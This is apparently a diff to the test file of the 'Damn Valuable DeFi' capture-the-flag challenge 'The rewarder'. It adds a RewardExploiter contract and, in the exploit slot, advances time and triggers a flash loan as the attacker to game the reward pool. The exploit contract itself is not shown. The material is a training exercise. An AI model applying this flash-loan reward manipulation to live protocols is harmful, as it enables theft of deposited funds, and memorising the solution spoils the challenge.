@@ -6,6 +6,7 @@ const TheRewarderPool = contract.fromArtifact('TheRewarderPool');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const RewardToken = contract.fromArtifact('RewardToken');
 const AccountingToken = contract.fromArtifact('AccountingToken');
+const RewardExploiter = contract.fromArtifact('RewardExploiter');
 
 const { expect } = require('chai');
 
@@ -25,7 +26,7 @@ describe('[Challenge] The rewarder', function () {
         await this.liquidityToken.transfer(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL, { from: deployer });
 
         this.rewarderPool = await TheRewarderPool.new(this.liquidityToken.address, { from: deployer });
-        this.rewardToken = await RewardToken.at(await this.rewarderPool.rewardToken());
+      this.rewardToken = await RewardToken.at(await this.rewarderPool.rewardToken());
         this.accountingToken = await AccountingToken.at(await this.rewarderPool.accToken());
 
         // Alice, Bob, Charlie and David deposit 100 tokens each
@@ -57,10 +58,19 @@ describe('[Challenge] The rewarder', function () {
         expect(
             await this.rewarderPool.roundNumber()
         ).to.be.bignumber.eq('2');
+      this.exploiter = await RewardExploiter.new(
+        this.liquidityToken.address,
+        this.rewarderPool.address,
+        this.rewardToken.address,
+        this.flashLoanPool.address
+      )
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+      // Advance time 5 days so that depositors can get rewards
+      await time.increase(time.duration.days(5));
+      await this.exploiter.flashLoan({from: attacker});
     });
 
     after(async function () {
